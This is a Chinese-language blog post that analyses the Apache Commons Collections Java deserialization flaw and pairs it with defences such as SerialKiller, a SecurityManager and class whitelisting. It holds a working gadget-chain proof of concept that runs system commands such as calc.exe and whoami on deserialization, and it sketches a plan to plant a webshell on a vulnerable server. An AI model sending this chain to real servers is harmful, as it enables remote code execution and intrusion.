---
title: Java 反序列化漏洞分析
tags: 反序列化
categories: Java
abbrlink: b9d809ac
date: 2018-03-28 01:08:56
copyright_author: Jitwxs
---

2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，阐述了利用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例，各大Java Web Server纷纷躺枪，这个漏洞横扫WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。而在将近10个月前， Gabriel Lawrence 和Chris Frohoff 就已经在AppSecCali上的一个报告里提到了这个漏洞利用思路。　

目前，针对这个"2015年最被低估"的漏洞，各大受影响的Java应用厂商陆续发布了修复后的版本，Apache Commons Collections项目也对存在漏洞的类库进行了一定的安全处理。但是网络上仍有大量网站受此漏洞影响。

## 一、认识Java序列化与反序列化

### 1.1 定义

序列化就是**把对象的状态信息转换为字节序列**(即可以存储或传输的形式)过程。

反序列化即逆过程，**由字节流还原成对象**。

注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。

### 1.2 用途

（1）把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中

（2）在网络上传送对象的字节序列

### 1.3 应用场景

（1）一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将`session`信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。

（2）在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，物理存入硬盘，以便减轻内存压力或便于长期保存。

比如最常见的是Web服务器中的`Session`对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。

例子： 淘宝每年都会有定时抢购的活动，很多用户会提前登录等待，长时间不进行操作，一致保存在内存中，而到达指定时刻，几十万用户并发访问，就可能会有几十万个session，内存可能吃不消。这时就需要进行对象的`活化`、`钝化`，让其在闲置的时候离开内存，将信息保存至硬盘，等要用的时候，就重新加载进内存。

### 1.4 API实现

（1）序列化 `java.io.ObjectOutputStream.writeObject()`
该方法对参数指定的obj对象进行**序列化**，把字节序列写到一个**目标输出流中**。 按Java的标准约定是给文件一个`.ser`扩展名。

（2）反序列化  `java.io.ObjectInputStream.readObject()`
该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。

```java
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.io.FileOutputStream;
import java.io.FileInputStream;

public class Java_Test{

    public static void main(String args[]) throws Exception {
        String obj = "ls ";

        // 将序列化对象写入文件object.txt中
        FileOutputStream fos = new FileOutputStream("aa.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(obj);
        os.close();

        // 从文件object.txt中读取数据
        FileInputStream fis = new FileInputStream("aa.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        // 通过反序列化恢复对象obj
        String obj2 = (String)ois.readObject();
        System.out.println(obj2);
        ois.close();
    }

}
```

我们可以看到，先通过输入流创建一个文件，再调用`ObjectOutputStream`类的 `writeObject`方法把**序列化**的数据写入该文件;然后调用`ObjectInputStream`类的`readObject`方法**反序列化**数据并打印数据内容。

实现`Serializable`和`Externalizable`接口的类的对象**才能被序列化**。

`Externalizable`接口**继承**自 `Serializable`接口，实现`Externalizable`接口的类完全**由自身来控制序列化的行为**，而仅实现`Serializable`接口的类**采用默认的序列化方式** 。

对象序列化包括如下步骤：

 1. 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流；
 2. 通过对象输出流的`writeObject()`方法写对象。

对象反序列化的步骤如下：

 1. 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；
 2. 通过对象输入流的`readObject()`方法读取对象。

### 1.5 代码实例

我们创建一个`Person`接口，然后写两个方法：

- 序列化方法：创建一个Person实例，调用函数为其三个成员变量赋值，通过`writeObject`方法把该对象序列化，写入`Person.txt`文件中。

- 反序列化方法：调用`readObject`方法，返回一个经过反序列化处理的对象。

在测试主类里面，我们先序列化Person对象，然后又反序列化该对象，最后调用函数获取各个成员变量的值。

```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.text.MessageFormat;
import java.io.Serializable;

class Person implements Serializable {
    private static final long serialVersionUID = -5809782578272943999L;
     
    private int age;
    private String name;
    private String sex;
    
    //省略getter/setter方法
}

/**
 * 测试对象的序列化和反序列
 */
public class SerializeDeserialize_readObject {

    public static void main(String[] args) throws Exception {
        SerializePerson();//序列化Person对象
        Person p = DeserializePerson();//反序列Perons对象
        System.out.println(MessageFormat.format("name={0},age={1},sex={2}",
                                                 p.getName(), p.getAge(), p.getSex()));
    }

    /**
     * 序列化Person对象
     */
    private static void SerializePerson() throws FileNotFoundException,
            IOException {
        Person person = new Person();
        person.setName("ssooking");
        person.setAge(20);
        person.setSex("男");
        // ObjectOutputStream 对象输出流，将Person对象存储到Person.txt文件中，完成对Person对象的序列化操作
        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(
                new File("Person.txt")));
        oo.writeObject(person);
        System.out.println("Person对象序列化成功！");
        oo.close();
    }

    /**
     * 反序列Perons对象
     */
    private static Person DeserializePerson() throws Exception, IOException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("Person.txt")));
        Person person = (Person) ois.readObject();
        System.out.println("Person对象反序列化成功！");
        return person;
    }

}
```

##  二、理解漏洞的产生

我们既然已经知道了序列化与反序列化的过程，那么如果反序列化的时候，这些即将被反序列化的数据被恶意构造了呢？

如果Java应用对用户输入，即**不可信数据**做了反序列化处理，那么攻击者可以通过**构造恶意输入**，让反序列化**产生非预期的对象**，非预期的对象在产生过程中就有可能带来任意代码执行。

 由于对java序列化/反序列化的需求，开发过程中常使用一些公共库。

>Apache Commons Collections
>官网：http://commons.apache.org/proper/commons-collections/ 
>Github：https://github.com/apache/commons-collections

`Apache Commons Collections` 是一个扩展了Java标准库里的Collection结构的第三方基础库。它包含有很多jar工具包如下图所示，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。

![](https://cdn.jsdelivr.net/gh/jitwxs/cdn/blog/posts/20180326182909368.png)

作为Apache开源项目的重要组件，`Commons Collections`被广泛应用于各种Java应用的开发，而又正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了**反序列化用漏洞的普遍性和严重性**。　

`Apache Commons Collections`中有一个特殊的接口，其中有一个实现该接口的类可以**通过调用Java的反射机制来调用任意函数**，叫做`InvokerTransformer`。

>Tip：什么是Java的反射机制？
> 在运行状态中：
>1）对于任意一个类，都能够判断一个对象所属的类；
>2）对于任意一个类，都能够知道这个类的所有属性和方法；
>3）对于任意一个对象，都能够调用它的任意一个方法和属性；
>这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。

## 三、POC构造

经过对前面序列与反序列化的了解，我们蠢蠢欲动。那么怎样利用这个漏洞呢，给出一丁点儿思路：
　
>构造一个对象 ——> 反序列化 ——> 提交数据

我们现在遇到的关键问题是： 什么样对象符合条件？如何执行命令？怎样让它在被反序列化的时候执行命令？

首先，我们可以知道，要想在java中调用外部命令，可以使用这个函数 `Runtime.getRuntime().exec()`，然而，我们现在需要先找到一个对象，可以存储并在特定情况下执行我们的命令。

### 3.1TransformedMap

Map类是存储键值对的数据结构， `Apache Commons Collections`中实现了`TransformedMap` ，该类可以在一个元素被添加/删除/或是被修改时，会调用`transform`方法自动进行特定的修饰变换，具体的变换逻辑由`Transformer`类定义。

也就是说，`TransformedMap`类中的数据**发生改变时**，**可以自动对进行一些特殊的变换**，比如在数据被修改时，把它改回来; 或者在数据改变时，进行一些我们提前设定好的操作。

至于会进行怎样的操作或变换，这是由我们提前设定的，这个叫做`transform`。等会我们就来了解一下transform。

我们可以通过`TransformedMap.decorate()`方法获得一个`TransformedMap`的实例：

```java
Map afterMap = TransformedMap.decorate(beforeMap, null, chainedTransformer);
```

- 参数一：**等待转换**的Map对象

- 参数二：Map对象内的**key**要经过的转换方法

- 参数三：Map对象内的**value**要经过的转换方法

注：参数二、三可为**单个方法**，也可为**链**，也可为**空**。

### 3.2 Transformer接口 

![](https://cdn.jsdelivr.net/gh/jitwxs/cdn/blog/posts/20180326184558509.png)

我们可以看到该类接收一个对象，获取该对象的名称，然后调用了一个`invoke`反射方法。另外，多个`Transformer`还能串起来，形成`ChainedTransformer`链。当触发时，`ChainedTransformer`可以**按顺序**调用一系列的变换。

下面是一些实现`Transformer`接口的类，箭头标注的是我们会用到的：

![](https://cdn.jsdelivr.net/gh/jitwxs/cdn/blog/posts/20180326184636432.png)

- `ConstantTransformer` ：把一个对象转化为常量，并返回。

- `InvokerTransformer`：通过反射，返回一个对象。 

- `ChainedTransformer`：`ChainedTransformer`为**链式**的`Transformer`，会挨个执行我们定义Transformer。

Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可**以通过Java的反射机制来调用任意函数**，叫做`InvokerTransformer`，源码如下：

```java
public class InvokerTransformer implements Transformer, Serializable {

...

    /*
        Input参数为要进行反射的对象，
        iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型
        iArgs为对应方法的参数
        在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数
    */
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);

        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

}
```

只需要传入方法名、参数类型和参数，即可调用任意函数。

![](https://cdn.jsdelivr.net/gh/jitwxs/cdn/blog/posts/20180326185035632.png)

在这里，我们可以看到，先用`ConstantTransformer()`获取了`Runtime`类，接着反射调用`getRuntime`函数，再调用getRuntime的`exec()`函数，执行命令"calc.exe"。依次调用关系为： **Runtime --> getRuntime --> exec()**。

因此，我们要提前构造 `ChainedTransformer`链，它会**按照我们设定的顺序依次调用**`Runtime`, `getRuntime`,`exec`函数，进而执行命令。正式开始时，我们先构造一个`TransformeMap`实例，然后想办法修改它其中的数据，使其自动调用`tansform()`方法进行特定的变换。

总结一下：

 1. 构造一个`Map`和一个能够执行代码的`ChainedTransformer`
 2. 生成一个`TransformedMap`实例
 3. 利用MapEntry的setValue()函数对**TransformedMap中的键值进行修改**
 4. 触发我们构造的之前构造的链式Transforme（即ChainedTransformer）**进行自动转换**

我们可以实现这个思路：

```java
public static void main(String[] args) throws Exception {
    //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", 
            new Class[] {String.class, Class[].class }, new Object[] {
            "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", 
            new Class[] {Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer("exec", 
            new Class[] {String.class }, new Object[] {"calc.exe"})};

    //首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap
    Transformer transformedChain = new ChainedTransformer(transformers);

    Map innerMap = new hashMap();
    innerMap.put("1", "zhang");

    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    //触发Map中的MapEntry产生修改（例如setValue()函数
    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
    
    onlyElement.setValue("foobar");
    /*代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：
       首先通过ConstantTransformer获得Runtime类
       进一步通过反射调用getMethod找到invoke函数
       最后再运行命令calc.exe。
    */
}
```

### 3.3 AnnotationInvocationHandler

目前的构造还需要依赖于Map中某一项去调用setValue()，那么怎样才能在调用`readObject()`方法时**直接触发执行**呢？

我们知道，如果一个类的方法被重写，那么在调用这个函数时，会优先调用经过修改的方法。因此，如果**某个可序列化的类重写了`readObject()`方法**，并且**在`readObject()`中对Map类型的变量进行了键值修改操作**，**且这个Map变量是可控的**，我们就可以实现攻击目标。

`AnnotationInvocationHandler`类有一个成员变量`memberValues`是Map类型 ，并且`AnnotationInvocationHandler`的`readObject()`函数中对`memberValues`的每一项调用了`setValue()`函数对value值进行一些变换。
![](https://cdn.jsdelivr.net/gh/jitwxs/cdn/blog/posts/2018032618570364.png)

这个类完全符合我们的要求，那么，我们的思路就非常清晰了：

 1. 首先构造一个Map和一个能够执行代码的`ChainedTransformer`
 2. 生成一个`TransformedMap`实例
 3. 实例化`AnnotationInvocationHandler`，并**对其进行序列化**
 4. 当触发`readObject()`反序列化的时候，就能实现命令执行

>TransformedMap--->AnnotationInvocationHandler.readObject()--->setValue()--->漏洞成功触发

### 3.4 代码实例

回顾下知识点：

（1）方法重写

如果一个类的方法被重写，那么调用该方法时**优先**调用该方法。

（2）反射机制

在运行状态中：

- 对于任意一个类，都能够判断一个对象所属的类；

- 对于任意一个类，都能够知道这个类的所有属性和方法；

- 对于任意一个对象，都能够调用它的任意一个方法和属性；

（3）关键类与函数

- **TransformedMap** ： 利用其value修改时触发transform()的特性

- **ChainedTransformer**： 会挨个执行我们定义的Transformer

- **Transformer**:  存放我们要执行的命令

-  **AnnotationInvocationHandler**： 对memberValues的每一项调用了setValue()函数

具体实现：

```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class POC_Test{
    public static void main(String[] args) throws Exception {
        //execArgs: 待执行的命令数组
        //String[] execArgs = new String[] { "sh", "-c", "whoami &gt; /tmp/fuck" };

        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            /*
            由于Method类的invoke(Object obj,Object args[])方法的定义
            所以在反射内写new Class[] {Object.class, Object[].class }
            正常POC流程举例：
            ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
            */
            new InvokerTransformer(
                "getMethod",
                new Class[] {String.class, Class[].class },
                new Object[] {"getRuntime", new Class[0] }
            ),
            new InvokerTransformer(
                "invoke",
                new Class[] {Object.class,Object[].class }, 
                new Object[] {null, null }
            ),
            new InvokerTransformer(
                "exec",
                new Class[] {String[].class },
                new Object[] { "whoami" }
                //new Object[] { execArgs } 
            )
        };

        //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
        Transformer transformedChain = new ChainedTransformer(transformers);

        //BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式
        Map<String,String> BeforeTransformerMap = new HashMap<String,String>();

        BeforeTransformerMap.put("hello", "hello");

        //Map数据结构，转换后的Map
       /*
       TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。
            第一个参数为待转化的Map对象
            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
            第三个参数为Map对象内的value要经过的转化方法。
       */
        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);

        File f = new File("temp.bin");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
    }
}

/*
思路:构建BeforeTransformerMap的键值对，为其赋值，
     利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme
     对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行

     执行本质: ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(.........)
     利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()

*/
```

## 四、漏洞分析

### 4.1 漏洞引发

如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。

### 4.2 漏洞原因

类`ObjectInputStream`在反序列化时，**没有对生成的对象的输入做限制**，使攻击者利用反射调用函数进行任意命令执行。

`CommonsCollections`组件中对于集合的操作**存在可以进行反射调用的方法**。

### 4.3 漏洞根源

Apache Commons Collections**允许链式的任意的类函数反射调用**。

问题函数：`org.apache.commons.collections.Transformer`接口。

### 4.4 攻击思路

攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的`TransformedMap`来执行。

至于如何使用这个漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化，将序列化后的二进制流发送给有这个漏洞的服务器，服务器会反序列化该数据的并生成一个webshell文件，然后就可以直接访问这个生成的webshell文件进行进一步利用。 

### 4.5 漏洞挖掘

（1）通过代码审计/行为分析等手段发现漏洞所在靶点。

（2）进行POC分析构造时可以利用逆推法。

## 五、漏洞修补与防护

目前打包有`apache-commons-collections`库并且应用比较广泛的主要组件有`Jenkins`、`WebLogic`、`Jboss`、`WebSphere`、`OpenNMS`。其中`Jenkins`由于功能需要大都直接暴露给公网。

除了`commons-collections 3.1`可以用来利用java反序列化漏洞，还有更多第三方库同样可以用来利用反序列化漏洞并执行任意代码，部分如下：

- commons-fileupload 1.3.1

- commons-io 2.4

- commons-collections 3.1

- commons-logging 1.2

- commons-beanutils 1.9.2

- org.slf4j:slf4j-api 1.7.21

- com.mchange:mchange-commons-java 0.2.11

- org.apache.commons:commons-collections 4.0

- com.mchange:c3p0 0.9.5.2

- org.beanshell:bsh 2.0b5

- org.codehaus.groovy:groovy 2.3.9

- ……

### 5.1 更新版本

更新相关库到更新版本。

### 5.2 SerialKiller

NibbleSecurity公司的ikkisoft在github上放出了一个临时补丁`SerialKiller`，[点击跳转](https://github.com/ikkisoft/SerialKiller)。

下载这个jar后放置于classpath，将应用代码中的`java.io.ObjectInputStream`替换为`SerialKiller`，之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有`Hot-Reload`,`Whitelisting`,`Blacklisting`几个特性，控制了外部输入反序列化后的可信类型。

### 5.3 禁止JVM执行外部命令

```java
SecurityManager originalSecurityManager = System.getSecurityManager();
    if (originalSecurityManager == null) {
        // 创建自己的SecurityManager
        SecurityManager sm = new SecurityManager() {
        private void check(Permission perm) {
            // 禁止exec
            if (perm instanceof java.io.FilePermission) {
                String actions = perm.getActions();
                if (actions != null &amp;&amp; actions.contains("execute")) {
                    throw new SecurityException("execute denied!");
                }
            }
            // 禁止设置新的SecurityManager
            if (perm instanceof java.lang.RuntimePermission) {
                String name = perm.getName();
                if (name != null &amp;&amp; name.contains("setSecurityManager")) {
                    throw new SecurityException(
                    "System.setSecurityManager denied!");
                }
            }
        }
        @Override
        public void checkPermission(Permission perm) {
            check(perm);
        }
        @Override
        public void checkPermission(Permission perm, Object context) {
            check(perm);
        }
    };
   System.setSecurityManager(sm);
}
```
如上所示，只要在Java代码里简单加一段程序，就可以禁止执行外部程序了。 

禁止JVM执行外部命令，是一个简单有效的提高JVM安全性的办法。可以考虑在代码安全扫描时，加强对`Runtime.exec`相关代码的检测。

### 5.4 白名单校验

业务需要使用反序列化时，尽量避免反序列化数据可被用户控制，如无法避免，使用白名单校验。

在 `ObjectInputStream` 中 `resolveClass` 里只是进行了 class 是否能被 load ，自定义 `ObjectInputStream` , 重载 `resolveClass` 的方法，对 className 进行白名单校验。

```java
public class MyObjectInputStream extends ObjectInputStream {	
@Override
	protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException{
         if(!desc.getName().equals("className")){
            throw new ClassNotFoundException(desc.getName()+" forbidden!");
        }
        return super.resolveClass(desc);
    }
}
```
